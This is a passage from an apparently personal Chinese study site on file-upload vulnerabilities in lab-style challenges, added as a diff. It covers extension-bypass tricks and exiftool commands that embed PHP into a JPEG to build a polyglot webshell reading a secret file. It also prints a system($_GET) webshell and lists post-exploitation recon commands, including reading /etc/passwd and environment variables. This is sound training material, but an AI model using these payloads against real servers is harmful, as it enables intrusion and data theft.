+<p><strong>找路径的正确姿势：打开"显示这个文件的页面"，看 <code>&lt;img src&gt;</code>。</strong></p>
+<h3 id="10system-php">坑 10：<code>system()</code> 里写 PHP 函数<a class="headerlink" href="#10system-php" title="Permanent link">&para;</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="x">❌ ?COMMAND=file_get_contents('/home/carlos/secret')</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="x">   → shell 找不到叫 file_get_contents 的程序</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="x">✅ ?COMMAND=cat /home/carlos/secret</span>
+</span></code></pre></div>
+<p><strong>要执行 PHP 函数，得把函数名写进代码里，不是写进参数里。</strong></p>
+<h3 id="11-shellphpjpg">坑 11：以为 <code>shell.php.jpg</code> 能绕白名单<a class="headerlink" href="#11-shellphpjpg" title="Permanent link">&para;</a></h3>
+<p><strong>白名单题里它是死路 —— 因为校验和执行都取最后一个后缀，两边一致。</strong></p>
+<p><strong><code>shell.php.jpg</code> 只在黑名单题 + Apache 特定 <code>AddHandler</code> 配置下才可能执行。</strong></p>
+<p><strong>用之前先判断：这道题是黑名单还是白名单。</strong></p>
+<h3 id="14">坑 14：改后缀一直提示"不是合法图片"<a class="headerlink" href="#14" title="Permanent link">&para;</a></h3>
+<p><strong>说明校验的是</strong>内容<strong>，不是后缀 —— 继续换后缀没有意义。</strong></p>
+<p><strong>判断口诀：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>改后缀有效   →  查后缀(换 .phtml / %00 / .htaccess)
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>改后缀无效   →  查内容(造 polyglot)
+</span></code></pre></div>
+<p><strong>很多人在这卡很久，因为"上传题 = 改后缀"是个刻板印象。</strong></p>
+<p><strong>上传题有三个变量：路径、后缀、内容。你已经把后缀那套试遍了，就该检查是不是卡在"内容"这一层。</strong></p>
+<h2 id="exiftool">十二、工具：exiftool 速查<a class="headerlink" href="#exiftool" title="Permanent link">&para;</a></h2>
+<h3 id="121">12.1 它是什么<a class="headerlink" href="#121" title="Permanent link">&para;</a></h3>
+<p><strong>读写图片/视频</strong>元数据<strong>的命令行工具。</strong></p>
+<p><strong>支持 EXIF、IPTC、XMP、文件内注释（Comment）等各种标签。</strong></p>
+<p><strong>上传题里的用途：把 PHP 代码写进一张真实图片的元数据里，造出 polyglot。</strong></p>
+<p>------exiftool--------------</p>
+<h3 id="123">12.3 三个核心参数<a class="headerlink" href="#123" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+<th>例子</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>-标签=值</code></strong></td>
+<td>写入某个标签</td>
+<td><code>-Comment="hello"</code></td>
+</tr>
+<tr>
+<td><strong><code>-o 文件名</code></strong></td>
+<td><strong>输出到新文件</strong>（不改原图）</td>
+<td><code>-o shell.php</code></td>
+</tr>
+<tr>
+<td><strong><code>-all=</code></strong></td>
+<td>清空所有元数据</td>
+<td><code>-all= -o clean.jpg</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>不加 <code>-o</code> 时，exiftool 会原地修改文件，并生成一个 <code>原文件名_original</code> 备份。</strong></p>
+<h3 id="124">12.4 上传题最常用的四条命令<a class="headerlink" href="#124" title="Permanent link">&para;</a></h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="c"># ① 把 PHP 写进 Comment,输出成 .php(polyglot 的核心命令)</span>
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="n">exiftool</span> <span class="n">-Comment</span><span class="p">=</span><span class="s2">"&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;"</span> <span class="n">photo</span><span class="p">.</span><span class="n">jpg</span> <span class="n">-o</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span>
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="c"># ② 验证写进去了</span>
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="n">exiftool</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">Comment</span>
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="c"># ③ 看全部元数据</span>
+</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="n">exiftool</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span>
+</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a>
+</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="c"># ④ 清空所有元数据</span>
+</span><span id="__span-45-11"><a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a><span class="n">exiftool</span> <span class="n">-all</span><span class="p">=</span> <span class="n">-o</span> <span class="n">clean</span><span class="p">.</span><span class="n">jpg</span> <span class="n">photo</span><span class="p">.</span><span class="n">jpg</span>
+</span></code></pre></div>
+<h3 id="125-jpeg">12.5 常用的标签（JPEG）<a class="headerlink" href="#125-jpeg" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>标签</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>-Comment</code></strong></td>
+<td><strong>文件注释,最常用</strong></td>
+</tr>
+<tr>
+<td><code>-ImageDescription</code></td>
+<td>图片描述</td>
+</tr>
+<tr>
+<td><code>-Artist</code></td>
+<td>作者</td>
+</tr>
+<tr>
+<td><code>-Copyright</code></td>
+<td>版权</td>
+</tr>
+<tr>
+<td><code>-UserComment</code></td>
+<td>用户注释(EXIF)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>写哪个标签不重要,关键是"代码能被写进文件字节里",而 PHP 执行时会忽略 <code>&lt;?php ?&gt;</code> 之外的一切。</strong></p>
+<p><strong>不是相对输入图片所在目录。</strong></p>
+<p><strong>③ PowerShell 引号</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c"># 外层双引号,里面用单引号</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="n">exiftool</span> <span class="n">-Comment</span><span class="p">=</span><span class="s2">"&lt;?php echo 'START ' . file_get_contents('/x') . ' END'; ?&gt;"</span> <span class="n">a</span><span class="p">.</span><span class="n">jpg</span> <span class="n">-o</span> <span class="n">b</span><span class="p">.</span><span class="n">php</span>
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="c"># 或者反过来</span>
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="n">exiftool</span> <span class="n">-Comment</span><span class="p">=</span><span class="s1">'&lt;?php echo "START " . file_get_contents("/x") . " END"; ?&gt;'</span> <span class="n">a</span><span class="p">.</span><span class="n">jpg</span> <span class="n">-o</span> <span class="n">b</span><span class="p">.</span><span class="n">php</span>
+</span></code></pre></div>
+<p><strong>别让内外层用同一种引号,会被吃掉。</strong></p>
+<h3 id="127-polyglot">12.7 polyglot 自检两条<a class="headerlink" href="#127-polyglot" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>① 双击 shell.php → 能用图片查看器正常打开 → 说明仍是合法 JPEG(能过内容校验)
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>② exiftool shell.php | Select-String Comment → 能看到你的 PHP → 代码写进去了
+</span></code></pre></div>
+<p><strong>两条都过,就可以上传了。</strong></p>
+<h2 id="shell_1">十三、拿到 shell 之后：常用命令速查<a class="headerlink" href="#shell_1" title="Permanent link">&para;</a></h2>
+<p><strong>上传成功只是拿到"执行入口",接下来要在这个入口里找 flag —— 用的就是 Linux 命令。</strong></p>
+<p><strong>你的 webshell 长这样：</strong></p>
+<p>这里 是利用老版本php可以<script language='php'> daima </script>--替换掉<?php   ?>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="x">&lt;script language='php'&gt; system($_GET['id']); &lt;/script&gt;</span>
+</span></code></pre></div></p>
+<p><strong>访问 <code>/upload/shell.phtml?id=命令</code> → 命令在</strong>目标服务器<strong>上执行。</strong></p>
+<h3 id="131">13.1 四步法（照着做就行）<a class="headerlink" href="#131" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>① pwd / ls        我在哪?这里有什么?
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>② cat             读文件
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>③ find            找不到就全盘搜
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>④ id / uname      看环境(权限、系统版本)
+</span></code></pre></div>
+<h3 id="132-10">13.2 最常用的 10 条命令<a class="headerlink" href="#132-10" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+<th>典型用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>pwd</code></strong></td>
+<td>我在哪个目录</td>
+<td><code>pwd</code></td>
+</tr>
+<tr>
+<td><strong><code>ls</code></strong></td>
+<td>列目录</td>
+<td><code>ls -la /var/www/html</code></td>
+</tr>
+<tr>
+<td><strong><code>cat</code></strong></td>
+<td>看文件内容</td>
+<td><code>cat /flag</code></td>
+</tr>
+<tr>
+<td><strong><code>find</code></strong></td>
+<td>按名字找文件</td>
+<td><code>find / -name "flag*" 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td><code>grep</code></td>
+<td>在文件里搜内容</td>
+<td><code>grep -r "flag" /var/www/html</code></td>
+</tr>
+<tr>
+<td><code>whoami</code></td>
+<td>当前用户</td>
+<td><code>whoami</code></td>
+</tr>
+<tr>
+<td><code>id</code></td>
+<td>用户和组详情</td>
+<td><code>id</code></td>
+</tr>
+<tr>
+<td><code>uname -a</code></td>
+<td>系统内核版本</td>
+<td><code>uname -a</code></td>
+</tr>
+<tr>
+<td><code>head</code> / <code>tail</code></td>
+<td>看文件头/尾</td>
+<td><code>head -20 /etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>env</code></td>
+<td>环境变量</td>
+<td><code>env</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="133-ls">13.3 <code>ls</code> 详解<a class="headerlink" href="#133-ls" title="Permanent link">&para;</a></h3>
+<p><strong><code>ls</code> = list,列出目录里有什么。</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ls</code></td>
+<td>列<strong>当前目录</strong></td>
+</tr>
+<tr>
+<td><strong><code>ls /</code></strong></td>
+<td><strong>列根目录</strong></td>
+</tr>
+<tr>
+<td><code>ls /home/carlos</code></td>
+<td>列指定目录</td>
+</tr>
+<tr>
+<td><code>ls -l</code></td>
+<td>详细列表（权限、大小、时间）</td>
+</tr>
+<tr>
+<td><code>ls -a</code></td>
+<td>包括隐藏文件（<code>.</code> 开头的）</td>
+</tr>
+<tr>
+<td><strong><code>ls -la</code></strong></td>
+<td><strong>最常用</strong>（详细 + 隐藏）</td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>ls /</code> 大概会看到：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>bin   boot  dev  etc  home  lib  media  mnt  opt
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>proc  root  run  sbin  srv  sys  tmp  usr  var
+</span></code></pre></div>
+<p><strong>这就是 Linux 的根目录结构。</strong></p>
+<p><strong><code>ls -l</code> 的输出怎么读：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>drwxr-xr-x  2 root root 4096 Oct 20 12:00 upload
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>-rw-r--r--  1 root root   61 Oct 20 12:00 shell.phtml
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>└┬┘└──┬───┘
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a> │    └── 权限(读/写/执行 × 属主/属组/其他人)
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a> └── d = 目录,- = 普通文件
+</span></code></pre></div>
+<p><strong>看到 <code>d</code> 开头就是文件夹，可以继续 <code>ls</code> 进去。</strong></p>
+<h3 id="134-cat">13.4 读文件：<code>cat</code> 家族<a class="headerlink" href="#134-cat" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+<th>场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>cat /flag</code></strong></td>
+<td>全部输出</td>
+<td>小文件</td>
+</tr>
+<tr>
+<td><code>head -20 文件</code></td>
+<td>前 20 行</td>
+<td>大文件先看头</td>
+</tr>
+<tr>
+<td><code>tail -20 文件</code></td>
+<td>后 20 行</td>
+<td>看日志尾部</td>
+</tr>
+<tr>
+<td><code>tac 文件</code></td>
+<td>倒序输出</td>
+<td>顺序不对时</td>
+</tr>
+<tr>
+<td><code>cat 文件1 文件2</code></td>
+<td>连读多个</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<p><strong>⚠️ <code>cat</code> 大文件会刷屏，先 <code>head</code> 或 <code>wc -l</code> 看看大小。</strong></p>
+<h3 id="135-flag">13.5 搜索：找不到 flag 就用这个<a class="headerlink" href="#135-flag" title="Permanent link">&para;</a></h3>
+<p><strong>按文件名搜：</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s2">"flag*"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>部分</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>find /</code></td>
+<td>从根目录开始找</td>
+</tr>
+<tr>
+<td><code>-name "flag*"</code></td>
+<td>名字以 flag 开头</td>
+</tr>
+<tr>
+<td><code>2&gt;/dev/null</code></td>
+<td><strong>把"没权限"的报错丢掉</strong>（不然刷屏）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>按文件内容搜：</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"flag{"</span><span class="w"> </span>/var/www/html
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"CTF"</span><span class="w"> </span>/home
+</span></code></pre></div>
+<p><strong><code>-r</code> = 递归搜子目录。</strong></p>
+<h3 id="136">13.6 看环境：判断这台机器什么情况<a class="headerlink" href="#136" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>输出什么</th>
+<th>有什么用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>whoami</code></td>
+<td><code>www-data</code></td>
+<td><strong>当前权限</strong>（能读哪些文件）</td>
+</tr>
+<tr>
+<td><code>id</code></td>
+<td><code>uid=33(www-data) gid=33(www-data)</code></td>
+<td>同上，更详细</td>
+</tr>
+<tr>
+<td><code>uname -a</code></td>
+<td><code>Linux xxx 5.4.0 ...</code></td>
+<td>系统/内核版本（找提权漏洞用）</td>
+</tr>
+<tr>
+<td><code>cat /etc/passwd</code></td>
+<td>用户列表</td>
+<td>看有哪些用户</td>
+</tr>
+<tr>
+<td><code>env</code></td>
+<td>环境变量</td>
+<td>有时有数据库密码</td>
+</tr>
+<tr>
+<td><code>ps aux</code></td>
+<td>进程列表</td>
+<td>看跑了什么服务</td>
+</tr>
+</tbody>
+</table>
+<h3 id="137-ctf-flag">13.7 CTF 里 flag 常放的位置<a class="headerlink" href="#137-ctf-flag" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>/flag
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>/flag.txt
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>/flag_is_here
+</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a>/home/用户名/secret
+</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>/var/www/html/flag.php
+</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a>/tmp/flag
+</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a>/root/flag        ← 通常要 root 权限
+</span></code></pre></div>
+<p><strong>实战顺序：</strong></p>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>ls<span class="w"> </span>/<span class="w">                          </span><span class="c1"># 根目录有没有 flag</span>
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>cat<span class="w"> </span>/flag<span class="w">                     </span><span class="c1"># 直接读</span>
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s2">"flag*"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w">   </span><span class="c1"># 找不到就搜</span>
+</span></code></pre></div>
+-------------------webshell里-------------</p>
+<p><strong>② 特殊字符要编码</strong></p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>编码</th>
+<th>例子</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>空格</td>
+<td><code>%20</code> 或 <code>+</code></td>
+<td><code>ls%20/</code></td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td><code>%26</code></td>
+<td>会被当参数分隔符</td>
+</tr>
+<tr>
+<td><code>\|</code>（管道）</td>
+<td><code>%7C</code></td>
+<td><code>ls%7Cgrep flag</code></td>
+</tr>
+<tr>
+<td><code>&gt;</code></td>
+<td><code>%3E</code></td>
+<td>输出重定向</td>
+</tr>
+<tr>
+<td><code>;</code></td>
+<td><code>%3B</code></td>
+<td>多条命令</td>
+</tr>
+</tbody>
+</table>
+<p><strong>③ 管道要小心</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>?id<span class="o">=</span>ls<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>flag<span class="w">        </span>←<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>和<span class="w"> </span><span class="p">|</span><span class="w"> </span>都可能出问题
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>?id<span class="o">=</span>ls%7Cgrep%20flag<span class="w">      </span>←<span class="w"> </span>编码后
+</span></code></pre></div>
+<h3 id="139">13.9 一句话总结<a class="headerlink" href="#139" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p><strong>拿到 shell 后先 <code>pwd</code> + <code>ls</code>,知道自己在哪、有什么。</strong></p>
+<p><strong>读文件用 <code>cat</code>,找不到就用 <code>find / -name "flag*" 2&gt;/dev/null</code>。</strong></p>
+<p><strong><code>2&gt;/dev/null</code> 是必备的 —— 不然权限报错会淹没你的结果。</strong></p>
+<p><strong>所有命令跑在目标服务器上,不是你本机。</strong></p>
+</blockquote>
+<h2 id="_17">十四、一句话总结<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><strong>上传题永远是三个问题:</strong>
+<strong>① 存到哪了(路径) ② 存成什么(后缀) ③ 那个目录执行不执行 PHP</strong></p>
+<p><strong>找路径靠"显示文件的页面源码",不靠猜。</strong>
+<strong>判断执行看响应头(有没有 <code>Last-Modified</code>/<code>Accept-Ranges</code>)和响应体(是源码还是输出)。</strong>
+<strong><code>filename</code> 里的 <code>../</code> 是搬运工,<code>%2f</code> 是它的绕过。</strong></p>
+</blockquote>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      仅用于个人学习与授权测试记录
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../../assets/js/bg-video.js"></script>
+      
+    
+  </body>
+</html>
